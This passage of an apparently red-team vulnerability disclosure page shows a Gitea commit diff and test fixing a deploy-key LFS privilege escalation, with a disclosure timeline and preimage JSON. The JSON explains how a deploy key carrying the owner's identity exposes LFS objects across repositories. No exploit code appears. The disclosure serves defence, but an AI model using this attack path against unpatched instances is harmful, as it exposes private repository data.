+<span class="diff-d">-						log.Error(&quot;Unable to create LFS MetaObject [%s] for %s/%s. Error: %v&quot;, p.Oid, rc.User, rc.Repo, err)</span>
+<span class="diff-d">-						writeStatus(ctx, http.StatusInternalServerError)</span>
+<span class="diff-d">-						return</span>
+<span class="diff-d">-					}</span>
+<span class="diff-d">-				} else {</span>
+<span class="diff-d">-					exists = false</span>
+<span class="diff-d">-				}</span>
+<span class="diff-d">-			}</span>
+<span class="diff-d">-</span>
+<span class="diff-c"> 			responseObject = buildObjectResponse(rc, p, false, !exists, err)</span>
+<span class="diff-c"> 		} else {</span>
+<span class="diff-c"> 			var err *lfs_module.ObjectError</span>
+<span class="diff-h">@@ -337,13 +329,17 @@ func UploadHandler(ctx *context.Context) {</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 	uploadOrVerify := func() error {</span>
+<span class="diff-c"> 		if exists {</span>
+<span class="diff-d">-			accessible, err := git_model.LFSObjectAccessible(ctx, ctx.Doer, p.Oid)</span>
+<span class="diff-d">-			if err != nil {</span>
+<span class="diff-d">-				log.Error(&quot;Unable to check if LFS MetaObject [%s] is accessible. Error: %v&quot;, p.Oid, err)</span>
+<span class="diff-a">+			// The bytes already exist in the content store. Only skip proof of</span>
+<span class="diff-a">+			// possession when the object is already linked to *this* repo; never</span>
+<span class="diff-a">+			// trust cross-repo access (ctx.Doer is the repo owner for deploy keys),</span>
+<span class="diff-a">+			// which would let a caller link an object it cannot produce.</span>
+<span class="diff-a">+			meta, err := git_model.GetLFSMetaObjectByOid(ctx, repository.ID, p.Oid)</span>
+<span class="diff-a">+			if err != nil &amp;&amp; err != git_model.ErrLFSObjectNotExist {</span>
+<span class="diff-a">+				log.Error(&quot;Unable to get LFS MetaObject [%s]. Error: %v&quot;, p.Oid, err)</span>
+<span class="diff-c"> 				return err</span>
+<span class="diff-c"> 			}</span>
+<span class="diff-d">-			if !accessible {</span>
+<span class="diff-d">-				// The file exists but the user has no access to it.</span>
+<span class="diff-a">+			if meta == nil {</span>
+<span class="diff-a">+				// The file exists but is not linked to this repo.</span>
+<span class="diff-c"> 				// The upload gets verified by hashing and size comparison to prove access to it.</span>
+<span class="diff-c"> 				hash := sha256.New()</span>
+<span class="diff-c"> 				written, err := io.Copy(hash, ctx.Req.Body)</span>
+<span class="diff-h">diff --git a/tests/integration/api_repo_lfs_test.go b/tests/integration/api_repo_lfs_test.go</span>
+<span class="diff-h">index 5dc8671e2aebd..0f65606017f61 100644</span>
+<span class="diff-h">--- a/tests/integration/api_repo_lfs_test.go</span>
+<span class="diff-h">+++ b/tests/integration/api_repo_lfs_test.go</span>
+<span class="diff-h">@@ -240,9 +240,14 @@ func TestAPILFSBatch(t *testing.T) {</span>
+<span class="diff-c"> 			assert.Equal(t, &quot;Size must be less than or equal to 2&quot;, br.Objects[0].Error.Message)</span>
+<span class="diff-c"> 		})</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-		t.Run(&quot;AddMeta&quot;, func(t *testing.T) {</span>
+<span class="diff-a">+		t.Run(&quot;CrossRepoObjectRequiresUpload&quot;, func(t *testing.T) {</span>
+<span class="diff-c"> 			defer tests.PrintCurrentTest(t)()</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+			// An object whose bytes already exist in the store but which is not</span>
+<span class="diff-a">+			// linked to this repo must not be silently linked, even when the</span>
+<span class="diff-a">+			// caller can access it in another repo. Auto-linking let a deploy key</span>
+<span class="diff-a">+			// (whose token carries the repo owner&#x27;s identity) exfiltrate objects</span>
+<span class="diff-a">+			// across repos without proving possession. The client must upload.</span>
+<span class="diff-c"> 			p := lfs.Pointer{Oid: &quot;05eeb4eb5be71f2dd291ca39157d6d9effd7d1ea19cbdc8a99411fe2a8f26a00&quot;, Size: 6}</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 			contentStore := lfs.NewContentStore()</span>
+<span class="diff-h">@@ -250,6 +255,7 @@ func TestAPILFSBatch(t *testing.T) {</span>
+<span class="diff-c"> 			assert.NoError(t, err)</span>
+<span class="diff-c"> 			assert.True(t, exist)</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+			// The object is linked to another repo owned by the same user.</span>
+<span class="diff-c"> 			repo2 := createLFSTestRepository(t, &quot;lfs-batch2-repo&quot;)</span>
+<span class="diff-c"> 			storeObjectInRepo(t, repo2.ID, &quot;dummy0&quot;)</span>
+<span class="diff-c"> </span>
+<span class="diff-h">@@ -266,11 +272,13 @@ func TestAPILFSBatch(t *testing.T) {</span>
+<span class="diff-c"> 			br := decodeResponse(t, resp.Body)</span>
+<span class="diff-c"> 			assert.Len(t, br.Objects, 1)</span>
+<span class="diff-c"> 			assert.Nil(t, br.Objects[0].Error)</span>
+<span class="diff-d">-			assert.Empty(t, br.Objects[0].Actions)</span>
+<span class="diff-a">+			// The client is told to upload instead of the object being linked.</span>
+<span class="diff-a">+			assert.Contains(t, br.Objects[0].Actions, &quot;upload&quot;)</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+			// No meta object may have been created for this repo.</span>
+<span class="diff-c"> 			meta, err = git_model.GetLFSMetaObjectByOid(t.Context(), repo.ID, p.Oid)</span>
+<span class="diff-d">-			assert.NoError(t, err)</span>
+<span class="diff-d">-			assert.NotNil(t, meta)</span>
+<span class="diff-a">+			assert.Nil(t, meta)</span>
+<span class="diff-a">+			assert.Equal(t, git_model.ErrLFSObjectNotExist, err)</span>
+<span class="diff-c"> </span>
+<span class="diff-c"> 			// Cleanup</span>
+<span class="diff-c"> 			err = contentStore.Delete(p.RelativePath())</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/go-gitea/gitea/commit/66a3723cbb1d2224be9dc62483902b6b2df226c0" rel="noopener noreferrer">https://github.com/go-gitea/gitea/commit/66a3723cbb1d2224be9dc62483902b6b2df226c0</a></p>
+
+
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-30</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-07-13</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-08-17</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">792fb8eabe7a87b60f3e2d0dd223112d1c98a3a08735d4fed6c05796f6021939aab5dbf05b80c0a0dbbf9e3fb4d7dff530b824f32a837f35d8c97760ac460be9</p>
+<p class="kicker">Committed 2026-05-07 07:06 UTC</p>
+<p class="kicker">Revealed 2026-08-17 17:47 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-VN61PHA0-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-VN61PHA0%22%2C%22bug_class%22%3A%22IDOR%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%22cb95c8100fab6c96%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A26%2B00%3A00%22%2C%22description%22%3A%22Gitea%27s%20LFS%20server%20%28%60services/lfs/server.go%60%29%20blindly%20trusts%20the%20%60UserID%60%20embedded%20in%20LFS%20JWT%20tokens%20and%20uses%20it%20as%20%60ctx.Doer%60%20for%20%2A%2Across-repository%2A%2A%20privilege%20decisions%20in%20%60LFSObjectAccessible%28%29%60.%20When%20combined%20with%20the%20fact%20that%20%60routers/private/serv.go%60%20sets%20%60UserID%20%3D%20repo.OwnerID%60%20for%20%2A%2Adeploy%20keys%2A%2A%2C%20a%20holder%20of%20a%20write-access%20deploy%20key%20on%20%2Aany%20single%20repo%2A%20can%20exfiltrate%20LFS%20objects%20from%20%2Aevery%20repo%2A%20the%20repo%20owner%20has%20access%20to%20%E2%80%94%20and%20if%20the%20owner%20is%20a%20site%20admin%2C%20from%20every%20repo%20on%20the%20instance.%5Cn%5CnDeploy%20keys%20exist%20precisely%20to%20give%20narrow%2C%20single-repo%20access%20to%20CI/CD%20systems.%20This%20vulnerability%20completely%20defeats%20that%20isolation%20for%20LFS%20data.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22serv.go%3A275%22%2C%22poc_sha256%22%3A%2246521d4e19c49eba7b8f1481658672703fd5774c21358a46644d0f3cccb03fb4%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22gitea%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3A%22The%20root%20cause%20is%20a%20trust-boundary%20mismatch%3A%20serv.go%20treats%20the%20JWT%20UserID%20as%20a%20cosmetic%20attribution%20label%20%28setting%20it%20to%20repo.OwnerID%20for%20deploy%20keys%20at%20line%20275%29%2C%20while%20server.go%20treats%20it%20as%20the%20authenticated%20principal%20for%20authorization%20decisions.%20The%20JWT%20correctly%20pins%20RepoID%20%28checked%20at%20line%20609%29%2C%20but%20LFSObjectAccessible%20at%20line%20268%20deliberately%20consults%20other%20repositories%20using%20the%20claimed%20user%27s%20permissions%20%E2%80%94%20and%20for%20deploy%20keys%20that%20claimed%20user%20is%20the%20repo%20owner%2C%20not%20the%20key%20holder.%20Additionally%2C%20line%20613%20only%20rejects%20Op%21%3D%27upload%27%20when%20mode%3D%3DWrite%2C%20so%20an%20upload-Op%20token%20is%20also%20valid%20for%20download.%22%2C%22title%22%3A%22Gitea%20LFS%20Deploy-Key%20Privilege%20Escalation%20%E2%80%94%20Cross-Repository%20Data%20Exfiltration%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-VN61PHA0&#34;,
+  &#34;bug_class&#34;: &#34;IDOR&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: &#34;cb95c8100fab6c96&#34;,
+  &#34;created_at&#34;: &#34;2026-03-30T23:19:26+00:00&#34;,
+  &#34;description&#34;: &#34;Gitea&#39;s LFS server (`services/lfs/server.go`) blindly trusts the `UserID` embedded in LFS JWT tokens and uses it as `ctx.Doer` for **cross-repository** privilege decisions in `LFSObjectAccessible()`. When combined with the fact that `routers/private/serv.go` sets `UserID = repo.OwnerID` for **deploy keys**, a holder of a write-access deploy key on *any single repo* can exfiltrate LFS objects from *every repo* the repo owner has access to — and if the owner is a site admin, from every repo on the instance.\n\nDeploy keys exist precisely to give narrow, single-repo access to CI/CD systems. This vulnerability completely defeats that isolation for LFS data.&#34;,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: &#34;serv.go:275&#34;,
+  &#34;poc_sha256&#34;: &#34;46521d4e19c49eba7b8f1481658672703fd5774c21358a46644d0f3cccb03fb4&#34;,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;gitea&#34;,
+  &#34;reproduction&#34;: null,
+  &#34;technical_details&#34;: &#34;The root cause is a trust-boundary mismatch: serv.go treats the JWT UserID as a cosmetic attribution label (setting it to repo.OwnerID for deploy keys at line 275), while server.go treats it as the authenticated principal for authorization decisions. The JWT correctly pins RepoID (checked at line 609), but LFSObjectAccessible at line 268 deliberately consults other repositories using the claimed user&#39;s permissions — and for deploy keys that claimed user is the repo owner, not the key holder. Additionally, line 613 only rejects Op!=&#39;upload&#39; when mode==Write, so an upload-Op token is also valid for download.&#34;,
+  &#34;title&#34;: &#34;Gitea LFS Deploy-Key Privilege Escalation — Cross-Repository Data Exfiltration&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
